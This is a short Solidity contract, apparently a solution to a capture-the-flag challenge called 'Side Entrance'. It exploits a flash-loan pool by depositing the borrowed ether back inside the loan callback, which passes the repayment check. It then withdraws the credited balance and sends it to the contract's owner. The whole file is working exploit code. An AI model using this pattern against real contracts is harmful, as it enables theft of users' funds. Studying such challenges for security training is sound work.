// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver {

    using Address for address payable;

    SideEntranceLenderPool public pool;
    address owner;

    constructor(address _pool) {
        owner = msg.sender;
        pool = SideEntranceLenderPool(_pool);
    }

    function flashLoan() external payable {
        pool.flashLoan(address(pool).balance);

        pool.withdraw();
        payable(owner).sendValue(address(this).balance);
    }

    function execute() external override payable {
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {}
}